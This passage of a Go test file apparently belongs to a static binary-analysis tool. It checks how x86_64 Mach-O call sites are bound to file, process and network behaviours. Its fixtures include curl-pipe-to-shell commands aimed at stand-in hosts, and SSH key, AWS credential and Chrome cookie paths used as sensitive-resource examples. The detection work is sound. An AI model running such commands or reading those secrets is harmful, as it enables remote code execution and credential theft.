	if target, ok := x86RIPRelativeIndirectCallPointer(^uint64(0)-2, positive); ok {
		t.Fatalf("overflowing instruction address produced target %#x", target)
	}
}

func TestX86IndirectImportedObjCFileReadBindsStaticCFStringArgument(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-1", LogicalPath: "benign-control"}
	function := machoFunction{Name: "collect", Start: 0x1000, End: 0x1040, Reachable: true}
	const (
		selectorRefVA = uint64(0x2000)
		selectorVA    = uint64(0x3000)
		objectVA      = uint64(0x4000)
		backingVA     = uint64(0x5000)
		pointerVA     = uint64(0x6000)
	)
	selector := "dataWithContentsOfFile:"
	path := "~/.ssh/id_rsa"
	selectorRef := make([]byte, 8)
	binary.LittleEndian.PutUint64(selectorRef, selectorVA)
	object := make([]byte, machOCFString64RecordSize)
	binary.LittleEndian.PutUint64(object[16:24], backingVA)
	binary.LittleEndian.PutUint64(object[24:32], uint64(len(path)))
	file := &macho.File{
		FileHeader: macho.FileHeader{Cpu: macho.CpuAmd64},
		ByteOrder:  binary.LittleEndian,
		Loads:      []macho.Load{testMachOIndirectSectionLoad("__got", "__DATA_CONST", pointerVA, 8, 0x6, 0, 0)},
		Symtab:     &macho.Symtab{Syms: []macho.Symbol{{Name: "_objc_msgSend", Type: 0x01}}},
		Dysymtab:   &macho.Dysymtab{DysymtabCmd: macho.DysymtabCmd{Iundefsym: 0, Nundefsym: 1}, IndirectSyms: []uint32{0}},
		Sections: []*macho.Section{
			testMachOSection("__objc_selrefs", selectorRefVA, selectorRef),
			testMachOSection("__objc_methname", selectorVA, append([]byte(selector), 0)),
			testMachOSection("__cfstring", objectVA, object),
			testMachOSection("__cstring", backingVA, []byte(path)),
		},
	}
	movSelector := encodeTestX86RIPRelativeMOVToReg(6, 0x1000, selectorRefVA)
	leaArgument := encodeTestX86RIPRelativeLEAToReg(2, 0x1000+uint64(len(movSelector)), objectVA)
	callVA := 0x1000 + uint64(len(movSelector)+len(leaArgument))
	data := append(append(movSelector, leaArgument...), encodeTestX86IndirectCALL(callVA, pointerVA)...)
	text := &macho.Section{SectionHeader: macho.SectionHeader{Addr: 0x1000, Size: uint64(len(data))}}

	count := extractX86DirectCalls(&graph, content, file, text, data, []machoFunction{function}, nil, nil, "x86_64")
	if count != 1 || len(graph.Operations) != 1 {
		t.Fatalf("x86_64 indirect Objective-C call = count %d, operations %#v", count, graph.Operations)
	}
	operation := graph.Operations[0]
	if operation.Kind != behavior.OperationFileRead || operation.RequiredResource().Value != path || operation.Qualifiers["resource_binding"] != "exact-call-argument" || len(operation.EvidenceIDs) != 4 {
		t.Fatalf("x86_64 indirect Objective-C path was not bound exactly: %#v", operation)
	}
}

func TestX86IndirectImportedNativeCallUsesSharedSemanticsAndProvenance(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-1", LogicalPath: "benign-control"}
	function := machoFunction{Name: "run", Start: 0x1000, End: 0x1020, Reachable: true}
	const (
		commandVA = uint64(0x3000)
		pointerVA = uint64(0x4000)
	)
	command := "/usr/bin/true"
	file := &macho.File{
		FileHeader: macho.FileHeader{Cpu: macho.CpuAmd64},
		ByteOrder:  binary.LittleEndian,
		Loads:      []macho.Load{testMachOIndirectSectionLoad("__got", "__DATA_CONST", pointerVA, 8, 0x6, 0, 0)},
		Symtab:     &macho.Symtab{Syms: []macho.Symbol{{Name: "_system", Type: 0x01}}},
		Dysymtab:   &macho.Dysymtab{DysymtabCmd: macho.DysymtabCmd{Iundefsym: 0, Nundefsym: 1}, IndirectSyms: []uint32{0}},
		Sections:   []*macho.Section{testMachOSection("__cstring", commandVA, append([]byte(command), 0))},
	}
	argument := encodeTestX86RIPRelativeLEAToReg(7, 0x1000, commandVA)
	callVA := 0x1000 + uint64(len(argument))
	data := append(argument, encodeTestX86IndirectCALL(callVA, pointerVA)...)
	text := &macho.Section{SectionHeader: macho.SectionHeader{Addr: 0x1000, Size: uint64(len(data))}}

	count := extractX86DirectCalls(&graph, content, file, text, data, []machoFunction{function}, nil, nil, "x86_64")
	if count != 1 {
		t.Fatalf("indirect native call count = %d, want 1", count)
	}
	if len(graph.Operations) == 0 || graph.Operations[0].Kind != behavior.OperationProcessExecute {
		t.Fatalf("indirect native call did not use shared operation semantics: %#v", graph.Operations)
	}
	foundImport := false
	for _, feature := range graph.Features {
		if feature.Key == "macho.import_call" && feature.Value == "system" && feature.Qualifiers["via"] == "indirect-symbol-pointer" {
			foundImport = true
		}
	}
	if !foundImport {
		t.Fatalf("missing indirect imported-call Feature: %#v", graph.Features)
	}
	foundEvidence := false
	for _, evidence := range graph.Evidence {
		if evidence.Method == "macho-indirect-symbol-pointer" && evidence.Kind == "imported-pointer-call" {
			foundEvidence = true
		}
	}
	if !foundEvidence {
		t.Fatalf("missing exact imported-pointer evidence: %#v", graph.Evidence)
	}
}

func TestX86GenericObjCFileWriteCallDoesNotBindMovedRawCStringArgument(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}
	function := machoFunction{Name: "save", Start: 0x1000, End: 0x1020, Reachable: true}
	selected := "/tmp/moved-objc-output.bin"
	other := "/tmp/other-moved-objc-output.bin"
	addMachOStringXref(&graph, content, "x86_64", machoStringXref{
		RefVA:    0x100e,
		Function: function,
		Literal:  machoStringLiteral{VA: 0x4000, Offset: 0x4000, Kind: "process-launch-path", Value: selected, Resource: behavior.NewResource(behavior.ResourceFile, selected)},
	})
	addMachOStringXref(&graph, content, "x86_64", machoStringXref{
		RefVA:    0x1018,
		Function: function,
		Literal:  machoStringLiteral{VA: 0x5000, Offset: 0x5000, Kind: "process-launch-path", Value: other, Resource: behavior.NewResource(behavior.ResourceFile, other)},
	})
	selectorData := append([]byte("writeToFile:options:error:"), 0)
	selrefData := make([]byte, 8)
	binary.LittleEndian.PutUint64(selrefData, 0x3000)
	file := &macho.File{
		ByteOrder: binary.LittleEndian,
		Sections: []*macho.Section{
			testMachOSection("__objc_selrefs", 0x2000, selrefData),
			testMachOSection("__objc_methname", 0x3000, selectorData),
			testMachOSection("__cstring", 0x4000, append([]byte(selected), 0)),
			testMachOSection("__cstring", 0x5000, append([]byte(other), 0)),
		},
	}
	movSelectorTemp := encodeTestX86RIPRelativeMOVToReg(0, 0x1000, 0x2000)
	movSelectorArg := encodeTestX86MOVReg(6, 0)
	leaArgTempVA := 0x1000 + uint64(len(movSelectorTemp)+len(movSelectorArg))
	leaArgTemp := encodeTestX86RIPRelativeLEAToReg(0, leaArgTempVA, 0x4000)
	movObjCArg := encodeTestX86MOVReg(2, 0)
	callVA := 0x1000 + uint64(len(movSelectorTemp)+len(movSelectorArg)+len(leaArgTemp)+len(movObjCArg))
	call := encodeTestX86CALL(callVA, 0x1100)
	data := append(append(append(append(movSelectorTemp, movSelectorArg...), leaArgTemp...), movObjCArg...), call...)
	text := &macho.Section{SectionHeader: macho.SectionHeader{Addr: 0x1000, Size: uint64(len(data))}}

	count := extractX86DirectCalls(&graph, content, file, text, data, []machoFunction{function}, map[uint64]string{0x1100: "_objc_msgSend"}, nil, "x86_64")
	if count != 1 {
		t.Fatalf("extractX86DirectCalls() count = %d, want 1", count)
	}
	if len(graph.Operations) != 1 || graph.Operations[0].Kind != behavior.OperationFileWrite || graph.Operations[0].RequiredResource().Value != "" || len(graph.Operations[0].EvidenceIDs) != 1 {
		t.Fatalf("moved raw C-string registers must not masquerade as NSString provenance: %#v", graph.Operations)
	}
}

func TestX86GenericObjCFileWriteCallDoesNotBindBaseRelativeRawCStringArgument(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}
	function := machoFunction{Name: "save", Start: 0x1000, End: 0x1020, Reachable: true}
	selected := "/tmp/base-objc-output.bin"
	other := "/tmp/other-base-objc-output.bin"
	selectorData := append([]byte("writeToFile:options:error:"), 0)
	selrefData := make([]byte, 8)
	binary.LittleEndian.PutUint64(selrefData, 0x3000)
	file := &macho.File{
		ByteOrder: binary.LittleEndian,
		Sections: []*macho.Section{
			testMachOSection("__objc_selrefs", 0x2000, selrefData),
			testMachOSection("__objc_methname", 0x3000, selectorData),
			testMachOSection("__cstring", 0x4040, append([]byte(selected), 0)),
			testMachOSection("__cstring", 0x5000, append([]byte(other), 0)),
		},
	}
	movSelector := encodeTestX86RIPRelativeMOVToReg(6, 0x1000, 0x2000)
	leaBaseVA := 0x1000 + uint64(len(movSelector))
	leaBase := encodeTestX86RIPRelativeLEAToReg(0, leaBaseVA, 0x4000)
	leaArg := encodeTestX86BaseDisp8(0x8d, 2, 0, 0x40)
	callVA := 0x1000 + uint64(len(movSelector)+len(leaBase)+len(leaArg))
	call := encodeTestX86CALL(callVA, 0x1100)
	data := append(append(append(movSelector, leaBase...), leaArg...), call...)
	addMachOStringXref(&graph, content, "x86_64", machoStringXref{
		RefVA:    0x1000 + uint64(len(movSelector)+len(leaBase)),
		Function: function,
		Literal:  machoStringLiteral{VA: 0x4040, Offset: 0x4040, Kind: "process-launch-path", Value: selected, Resource: behavior.NewResource(behavior.ResourceFile, selected)},
	})
	addMachOStringXref(&graph, content, "x86_64", machoStringXref{
		RefVA:    callVA,
		Function: function,
		Literal:  machoStringLiteral{VA: 0x5000, Offset: 0x5000, Kind: "process-launch-path", Value: other, Resource: behavior.NewResource(behavior.ResourceFile, other)},
	})
	text := &macho.Section{SectionHeader: macho.SectionHeader{Addr: 0x1000, Size: uint64(len(data))}}

	count := extractX86DirectCalls(&graph, content, file, text, data, []machoFunction{function}, map[uint64]string{0x1100: "_objc_msgSend"}, nil, "x86_64")
	if count != 1 {
		t.Fatalf("extractX86DirectCalls() count = %d, want 1", count)
	}
	if len(graph.Operations) != 1 || graph.Operations[0].Kind != behavior.OperationFileWrite || graph.Operations[0].RequiredResource().Value != "" || len(graph.Operations[0].EvidenceIDs) != 1 {
		t.Fatalf("base-relative raw C-string must not masquerade as NSString provenance: %#v", graph.Operations)
	}
}

func TestX86GenericObjCNetworkCallDoesNotReuseBaseAcrossFunctionBoundary(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}
	selected := "https://cross-function-base-objc.example/payload"
	other := "https://other-cross-function-base-objc.example/payload"
	selectorData := append([]byte("dataTaskWithURL:"), 0)
	selrefData := make([]byte, 8)
	binary.LittleEndian.PutUint64(selrefData, 0x3000)
	file := &macho.File{
		ByteOrder: binary.LittleEndian,
		Sections: []*macho.Section{
			testMachOSection("__objc_selrefs", 0x2000, selrefData),
			testMachOSection("__objc_methname", 0x3000, selectorData),
			testMachOSection("__cstring", 0x4040, append([]byte(selected), 0)),
			testMachOSection("__cstring", 0x5000, append([]byte(other), 0)),
		},
	}
	leaBase := encodeTestX86RIPRelativeLEAToReg(0, 0x1000, 0x4000)
	movSelectorVA := 0x1000 + uint64(len(leaBase))
	movSelector := encodeTestX86RIPRelativeMOVToReg(6, movSelectorVA, 0x2000)
	leaArg := encodeTestX86BaseDisp8(0x8d, 2, 0, 0x40)
	callVA := 0x1000 + uint64(len(leaBase)+len(movSelector)+len(leaArg))
	call := encodeTestX86CALL(callVA, 0x1100)
	data := append(append(append(leaBase, movSelector...), leaArg...), call...)
	functions := []machoFunction{
		{Name: "setBase", Start: 0x1000, End: 0x1000 + uint64(len(leaBase)), Reachable: true},
		{Name: "connect", Start: 0x1000 + uint64(len(leaBase)), End: 0x1000 + uint64(len(data)), Reachable: true},
	}
	addMachOStringXref(&graph, content, "x86_64", machoStringXref{
		RefVA:    0x1000 + uint64(len(leaBase)+len(movSelector)),
		Function: functions[1],
		Literal:  machoStringLiteral{VA: 0x4040, Offset: 0x4040, Kind: "url", Value: selected},
	})
	addMachOStringXref(&graph, content, "x86_64", machoStringXref{
		RefVA:    callVA,
		Function: functions[1],
		Literal:  machoStringLiteral{VA: 0x5000, Offset: 0x5000, Kind: "url", Value: other},
	})
	text := &macho.Section{SectionHeader: macho.SectionHeader{Addr: 0x1000, Size: uint64(len(data))}}

	count := extractX86DirectCalls(&graph, content, file, text, data, functions, map[uint64]string{0x1100: "_objc_msgSend"}, nil, "x86_64")
	if count != 1 {
		t.Fatalf("extractX86DirectCalls() count = %d, want 1", count)
	}
	if hasOperationWithArch(&graph, "network.connect", "network-destination", selected, "connect", "x86_64") ||
		hasOperationWithArch(&graph, "network.connect", "network-destination", other, "connect", "x86_64") {
		t.Fatalf("base address state must not cross function boundaries: %#v", graph.Operations)
	}
}

func TestX86ObjCFileReadCallDoesNotReuseResourceAfterArgumentOverwrite(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}
	function := machoFunction{Name: "collect", Start: 0x1000, End: 0x1020, Reachable: true}
	first := "~/Library/Application Support/Google/Chrome/Default/Cookies"
	second := "~/.ssh/id_rsa"
	addMachOStringXref(&graph, content, "x86_64", machoStringXref{
		RefVA:    0x1007,
		Function: function,
		Literal: machoStringLiteral{
			VA:       0x4000,
			Offset:   0x4000,
			Kind:     "sensitive-resource",
			Value:    first,
			Resource: behavior.Resource{Kind: behavior.ResourceFile, Value: first, Classifications: []behavior.ResourceClassification{behavior.ResourceClassBrowserCookieStore}},
		},
	})
	addMachOStringXref(&graph, content, "x86_64", machoStringXref{
		RefVA:    0x100d,
		Function: function,
		Literal: machoStringLiteral{
			VA:       0x5000,
			Offset:   0x5000,
			Kind:     "sensitive-resource",
			Value:    second,
			Resource: behavior.Resource{Kind: behavior.ResourceFile, Value: second, Classifications: []behavior.ResourceClassification{behavior.ResourceClassSSHPrivateKey}},
		},
	})
	selectorData := append([]byte("dataWithContentsOfFile:"), 0)
	selrefData := make([]byte, 8)
	binary.LittleEndian.PutUint64(selrefData, 0x3000)
	file := &macho.File{
		ByteOrder: binary.LittleEndian,
		Sections: []*macho.Section{
			testMachOSection("__objc_selrefs", 0x2000, selrefData),
			testMachOSection("__objc_methname", 0x3000, selectorData),
			testMachOSection("__cstring", 0x4000, append([]byte(first), 0)),
			testMachOSection("__cstring", 0x5000, append([]byte(second), 0)),
		},
	}
	movSelector := encodeTestX86RIPRelativeMOVToReg(6, 0x1000, 0x2000)
	leaArg := encodeTestX86RIPRelativeLEAToReg(2, 0x1000+uint64(len(movSelector)), 0x4000)
	clobberRDX := []byte{0x48, 0x89, 0xc2}
	callVA := 0x1000 + uint64(len(movSelector)+len(leaArg)+len(clobberRDX))
	call := encodeTestX86CALL(callVA, 0x1100)
	data := append(append(append(movSelector, leaArg...), clobberRDX...), call...)
	text := &macho.Section{SectionHeader: macho.SectionHeader{Addr: 0x1000, Size: uint64(len(data))}}

	count := extractX86DirectCalls(&graph, content, file, text, data, []machoFunction{function}, map[uint64]string{0x1100: "_objc_msgSend"}, nil, "x86_64")
	if count != 1 {
		t.Fatalf("extractX86DirectCalls() count = %d, want 1", count)
	}
	if len(graph.Operations) != 1 || graph.Operations[0].Kind != "file.read" || graph.Operations[0].RequiredResource().Kind != "file" || graph.Operations[0].RequiredResource().Value != "" {
		t.Fatalf("overwritten rdx should leave ObjC file-read operation generic: %#v", graph.Operations)
	}
}

func TestMachOCalledSystemIgnoresShellCommandXrefFromDifferentFunction(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}
	addMachOStringXref(&graph, content, "x86_64", machoStringXref{
		RefVA:    0x1000,
		Function: machoFunction{Name: "other"},
		Literal:  machoStringLiteral{VA: 0x3000, Offset: 80, Kind: "shell-command", Value: "curl https://other.example/payload | sh"},
	})
	addOperationFromCalledImportedSymbol(&graph, content, "_system", "x86_64", "ev-call", machoFunction{Name: "runShell", Reachable: true})

	if hasOperationKind(&graph, "network.download") || hasOperationFlowRelation(graph.Relations) {
		t.Fatalf("system command expansion must require same-function command xref: operations=%#v chains=%#v", graph.Operations, graph.Relations)
	}
}

func TestMachOCalledSystemLeavesMultipleShellCommandXrefsUnexpanded(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}
	function := machoFunction{Name: "runShell", Reachable: true}
	for i, command := range []string{
		"curl https://one.example/payload | sh",
		"curl https://two.example/payload | sh",
	} {
		addMachOStringXref(&graph, content, "x86_64", machoStringXref{
			RefVA:    0x1000 + uint64(i),
			Function: function,
			Literal:  machoStringLiteral{VA: 0x3000 + uint64(i), Offset: 80 + i, Kind: "shell-command", Value: command},
		})
	}
	addOperationFromCalledImportedSymbol(&graph, content, "_system", "x86_64", "ev-call", function)

	if hasOperationKind(&graph, "network.download") || hasOperationFlowRelation(graph.Relations) {
		t.Fatalf("ambiguous system command xrefs should not be expanded: operations=%#v chains=%#v", graph.Operations, graph.Relations)
	}
}

func TestMachOCalledDescriptorReadAPIRemainsChannelScoped(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}
	addOperationFromCalledImportedSymbol(&graph, content, "_read", "x86_64", "ev-1", machoFunction{
		Name:      "collect",
		Reachable: true,
	})

	assertUnresolvedNativePrimitive(t, &graph, behavior.OperationIORead, behavior.ResourceIOChannel)
}

func TestMachOCalledDescriptorReadAPIDoesNotBindSameFunctionResourceXref(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}
	function := machoFunction{Name: "collect", Reachable: true}
	addMachOStringXref(&graph, content, "x86_64", machoStringXref{
		RefVA:    0x1000,
		Function: function,
		Literal: machoStringLiteral{
			VA:       0x3000,
			Offset:   80,
			Kind:     "sensitive-resource",
			Value:    "~/Library/Application Support/Google/Chrome/Default/Cookies",
			Resource: behavior.Resource{Kind: behavior.ResourceFile, Value: "~/Library/Application Support/Google/Chrome/Default/Cookies", Classifications: []behavior.ResourceClassification{behavior.ResourceClassBrowserCookieStore}},
		},
	})
	addOperationFromCalledImportedSymbol(&graph, content, "_read", "x86_64", "ev-call", function)

	assertUnresolvedNativePrimitive(t, &graph, behavior.OperationIORead, behavior.ResourceIOChannel)
}

func TestMachOCalledDescriptorReadAPIIgnoresSensitiveResourceXrefFromDifferentFunction(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}
	addMachOStringXref(&graph, content, "x86_64", machoStringXref{
		RefVA:    0x1000,
		Function: machoFunction{Name: "other"},
		Literal: machoStringLiteral{
			VA:       0x3000,
			Offset:   80,
			Kind:     "sensitive-resource",
			Value:    "~/.ssh/id_rsa",
			Resource: behavior.Resource{Kind: behavior.ResourceFile, Value: "~/.ssh/id_rsa", Classifications: []behavior.ResourceClassification{behavior.ResourceClassSSHPrivateKey}},
		},
	})
	addOperationFromCalledImportedSymbol(&graph, content, "_read", "x86_64", "ev-call", machoFunction{Name: "collect", Reachable: true})

	assertUnresolvedNativePrimitive(t, &graph, behavior.OperationIORead, behavior.ResourceIOChannel)
}

func TestMachOCalledDescriptorReadAPILeavesMultipleSensitiveResourceXrefsNeutral(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}
	function := machoFunction{Name: "collect", Reachable: true}
	for i, resource := range []behavior.Resource{
		behavior.NewResource(behavior.ResourceFile, "~/.ssh/id_rsa", behavior.ResourceClassSSHPrivateKey),
		behavior.NewResource(behavior.ResourceFile, "~/.aws/credentials", behavior.ResourceClassCloudCredentialStore),
	} {
		addMachOStringXref(&graph, content, "x86_64", machoStringXref{
			RefVA:    0x1000 + uint64(i),
			Function: function,
			Literal: machoStringLiteral{
				VA:       0x3000 + uint64(i),
				Offset:   80 + i,
				Kind:     "sensitive-resource",
				Value:    resource.Value,
				Resource: resource,
			},
		})
	}
	addOperationFromCalledImportedSymbol(&graph, content, "_read", "x86_64", "ev-call", function)

	assertUnresolvedNativePrimitive(t, &graph, behavior.OperationIORead, behavior.ResourceIOChannel)
}

func TestAmbiguousCalledAPIsRemainNeutral(t *testing.T) {
	for _, symbol := range []string{
		"_SMLoginItemSetEnabled",                      // boolean argument may disable the item
		"_PasteboardCreate", "_PasteboardSynchronize", // setup, not collection
		"_CGGetActiveDisplayList", "_CGDisplayStreamCreate", // enumeration/configuration, not capture
	} {
		t.Run(symbol, func(t *testing.T) {
			var graph behavior.Graph
			addOperationFromCalledImportedSymbol(&graph, artifact.Content{NodeID: "node-1", LogicalPath: "sample"}, symbol, "x86_64", "ev-1", machoFunction{Name: "caller", Reachable: true})
			if len(graph.Operations) != 0 {
				t.Fatalf("ambiguous call %s must not become a behavior operation: %#v", symbol, graph.Operations)
			}
		})
	}
}

func TestCalledOpenAndReadAPIsRetainOnlyTheirExactPrimitive(t *testing.T) {
	for _, test := range []struct {
		symbol       string
		kind         behavior.OperationKind
		resourceKind behavior.ResourceKind
	}{
		{"_open", behavior.OperationFileOpen, behavior.ResourceFile},
		{"_openat", behavior.OperationFileOpen, behavior.ResourceFile},
		{"_fopen", behavior.OperationFileOpen, behavior.ResourceFile},
		{"_freopen", behavior.OperationFileOpen, behavior.ResourceFile},
		{"_read", behavior.OperationIORead, behavior.ResourceIOChannel},
		{"_pread", behavior.OperationIORead, behavior.ResourceIOChannel},
		{"_readv", behavior.OperationIORead, behavior.ResourceIOChannel},
		{"_fread", behavior.OperationIORead, behavior.ResourceIOChannel},
	} {
		t.Run(test.symbol, func(t *testing.T) {
			var graph behavior.Graph
			addOperationFromCalledImportedSymbol(&graph, artifact.Content{NodeID: "node-1", LogicalPath: "sample"}, test.symbol, "x86_64", "ev-1", machoFunction{Name: "caller", Reachable: true})
			assertUnresolvedNativePrimitive(t, &graph, test.kind, test.resourceKind)
			if hasOperationKind(&graph, behavior.OperationFileRead) || hasOperationKind(&graph, behavior.OperationFileWrite) {
				t.Fatalf("open/read primitive must not invent file.read or file.write: %#v", graph.Operations)
			}
		})
	}
}

func TestMachOCalledLibcurlDoesNotBindSameFunctionURLXref(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}
	function := machoFunction{Name: "connect", Reachable: true}
	addMachOStringXref(&graph, content, "x86_64", machoStringXref{
		RefVA:    0x1000,
		Function: function,
		Literal:  machoStringLiteral{VA: 0x3000, Offset: 80, Kind: "url", Value: "https://api.example/payload"},
	})
	addOperationFromCalledImportedSymbol(&graph, content, "_curl_easy_perform", "x86_64", "ev-call", function)

	if len(graph.Operations) != 0 {
		t.Fatalf("libcurl handle call without configured URL provenance became a network operation: %#v", graph.Operations)
	}
	var called behavior.NetworkImplementationObservation
	for _, item := range graph.Network {
		if item.Kind == behavior.NetworkImplementationAPICall {
			called = item
		}
	}
	if len(called.OperationIDs) != 0 {
		t.Fatalf("unbound called API observation should not reference an operation: %#v", graph.Network)
	}
	if !stringSliceContains(called.UnresolvedProperties, "destination") || !stringSliceContains(called.UnresolvedProperties, "libcurl options") {
		t.Fatalf("called API detail should retain handle and destination uncertainty: %#v", called)
	}
}

func TestMachOCalledNetworkAPIIgnoresURLXrefFromDifferentFunction(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}
	addMachOStringXref(&graph, content, "x86_64", machoStringXref{
		RefVA:    0x1000,
		Function: machoFunction{Name: "other"},
		Literal:  machoStringLiteral{VA: 0x3000, Offset: 80, Kind: "url", Value: "https://other.example/payload"},
	})
	addOperationFromCalledImportedSymbol(&graph, content, "_curl_easy_perform", "x86_64", "ev-call", machoFunction{Name: "connect", Reachable: true})

	if len(graph.Operations) != 0 {
		t.Fatalf("libcurl call without configured URL provenance became a network operation: %#v", graph.Operations)
	}
	for _, item := range graph.Network {
		if item.Kind == behavior.NetworkImplementationAPICall && !stringSliceContains(item.UnresolvedProperties, "destination") {
			t.Fatalf("called API observation should retain an unresolved destination: %#v", graph.Network)
		}
	}
}

func TestMachOCalledNetworkAPILeavesMultipleURLXrefsUnresolved(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}
	function := machoFunction{Name: "connect", Reachable: true}
	for i, value := range []string{"https://one.example/payload", "https://two.example/payload"} {
		addMachOStringXref(&graph, content, "x86_64", machoStringXref{
			RefVA:    0x1000 + uint64(i),
			Function: function,
			Literal:  machoStringLiteral{VA: 0x3000 + uint64(i), Offset: 80 + i, Kind: "url", Value: value},
		})
	}
	addOperationFromCalledImportedSymbol(&graph, content, "_curl_easy_perform", "x86_64", "ev-call", function)

	if len(graph.Operations) != 0 {
		t.Fatalf("multiple unrelated URL xrefs should not create a network operation: %#v", graph.Operations)
	}
	for _, item := range graph.Network {
		if item.Kind == behavior.NetworkImplementationAPICall && !stringSliceContains(item.UnresolvedProperties, "destination") {
			t.Fatalf("multiple URL xrefs should leave called API observation destination unresolved: %#v", graph.Network)
		}
	}
}

func TestMachODirectLocalCallMarksCalleeReachable(t *testing.T) {
	entry := make([]byte, 24)
	binary.LittleEndian.PutUint32(entry[0:4], lcMain)
	binary.LittleEndian.PutUint32(entry[4:8], uint32(len(entry)))
	file := &macho.File{
		FileHeader: macho.FileHeader{Cpu: macho.CpuAmd64, Type: macho.TypeExec},
		ByteOrder:  binary.LittleEndian,
		Loads: []macho.Load{
			&macho.Segment{SegmentHeader: macho.SegmentHeader{Offset: 0, Filesz: 0x100, Addr: 0x1000}},
			macho.LoadBytes(entry),
		},
	}
	text := &macho.Section{SectionHeader: macho.SectionHeader{Addr: 0x1000}}
	data := []byte{
		0xe8, 0x01, 0x00, 0x00, 0x00, // main calls helper at 0x1006
		0xc3, // unrelated gap
		0xc3, // helper
		0xc3, // sibling
	}
	functions := []machoFunction{
		{Name: "main", Start: 0x1000, End: 0x1006},
		{Name: "sub_1006", Start: 0x1006, End: 0x1007},
		{Name: "sub_1007", Start: 0x1007, End: 0x1008},
	}

	markReachableFunctions(file, text, data, functions)
	if !functions[1].Reachable {
		t.Fatalf("direct local callee should be reachable from main: %#v", functions)
	}
	if functions[2].Reachable {
		t.Fatalf("unrelated sibling should remain unresolved: %#v", functions)
	}
}

func TestX86InstructionBoundariesRejectEmbeddedCallOpcode(t *testing.T) {
	// PUSH imm32 is five bytes. Its immediate deliberately begins with E8 and,
	// together with the following byte, spells a fake call to helper. A byte
	// scanner sees a call at +1; an instruction decoder sees one PUSH.
	data := bytes.Repeat([]byte{0x90}, 17)
	copy(data, []byte{0x68, 0xe8, 0x0a, 0x00, 0x00, 0x00})
	functions := []machoFunction{
		{Name: "main", Start: 0x1000, End: 0x1010},
		{Name: "helper", Start: 0x1010, End: 0x1011},
	}

	edges, incomplete := x86LocalCallEdgesBoundedWithRanges(0x1000, data, functions, len(data), 10, 10, nil)
	if incomplete || len(edges) != 0 {
		t.Fatalf("embedded E8 operand created an edge: edges=%#v incomplete=%v", edges, incomplete)
	}

	positive := append(encodeTestX86CALL(0x1000, 0x1010), bytes.Repeat([]byte{0x90}, 12)...)
	edges, incomplete = x86LocalCallEdgesBoundedWithRanges(0x1000, positive, functions, len(positive), 10, 10, nil)
	if incomplete || len(edges) != 1 || edges[0] != (localCallEdge{caller: 0, callee: 1}) {
		t.Fatalf("valid boundary-aligned call was not retained: edges=%#v incomplete=%v", edges, incomplete)
	}
}

func TestX86InstructionBoundariesRejectEmbeddedRIPRelativeOperands(t *testing.T) {
	functions := []machoFunction{{Name: "main", Start: 0x1000, End: 0x100a}}
	literals := newMachOStringLiteralIndex([]machoStringLiteral{{VA: 0x2000, Size: 8, Kind: "url", Value: "https://example.invalid"}})
	for _, opcode := range []byte{0x8d, 0x8b} { // LEA and MOV
		t.Run(fmt.Sprintf("opcode_%02x", opcode), func(t *testing.T) {
			// MOVABS rax, imm64; its immediate embeds a complete RIP-relative
			// instruction targeting the literal at 0x2000.
			data := []byte{0x48, 0xb8, 0x48, opcode, 0x05, 0xf7, 0x0f, 0x00, 0x00, 0x00}
			xrefs, incomplete := x86StringXrefsIndexedBounded(&macho.File{ByteOrder: binary.LittleEndian}, newMachOSectionIndex(&macho.File{}), 0x1000, data, functions, literals, nil)
			if incomplete || len(xrefs) != 0 {
				t.Fatalf("embedded RIP-relative opcode created an xref: %#v incomplete=%v", xrefs, incomplete)
			}
		})

	}

	positive := encodeTestX86RIPRelativeLEAToReg(0, 0x1000, 0x2000)
	positiveFunctions := []machoFunction{{Name: "main", Start: 0x1000, End: 0x1000 + uint64(len(positive))}}
	xrefs, incomplete := x86StringXrefsIndexedBounded(&macho.File{ByteOrder: binary.LittleEndian}, newMachOSectionIndex(&macho.File{}), 0x1000, positive, positiveFunctions, literals, nil)
	if incomplete || len(xrefs) != 1 || xrefs[0].Literal.Value != "https://example.invalid" {
		t.Fatalf("valid boundary-aligned LEA was not retained: %#v incomplete=%v", xrefs, incomplete)
	}
}

func TestX86DecodeFailureStopsAffectedFunctionWithoutResynchronizing(t *testing.T) {
	// The malformed EVEX prefix is followed by bytes spelling a valid E8 call
	// inside the same recovered function. Decode failure must skip that range.
	data := []byte{0x62, 0xff, 0xff, 0xff}
	data = append(data, encodeTestX86CALL(0x1004, 0x1020)...)
	data = append(data, bytes.Repeat([]byte{0x90}, 0x20-len(data)+1)...)
	functions := []machoFunction{
		{Name: "broken", Start: 0x1000, End: 0x1020},
		{Name: "target", Start: 0x1020, End: 0x1021},
	}
	edges, incomplete := x86LocalCallEdgesBoundedWithRanges(0x1000, data, functions, len(data), 10, 10, nil)
	if !incomplete || len(edges) != 0 {
		t.Fatalf("decoder failure resynchronized inside a function: edges=%#v incomplete=%v", edges, incomplete)
	}
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-1", LogicalPath: "malformed"}
	text := &macho.Section{SectionHeader: macho.SectionHeader{Addr: 0x1000, Size: uint64(len(data))}}
	extractX86DirectCalls(&graph, content, &macho.File{ByteOrder: binary.LittleEndian}, text, data, functions, map[uint64]string{0x1020: "_system"}, nil, "x86_64")
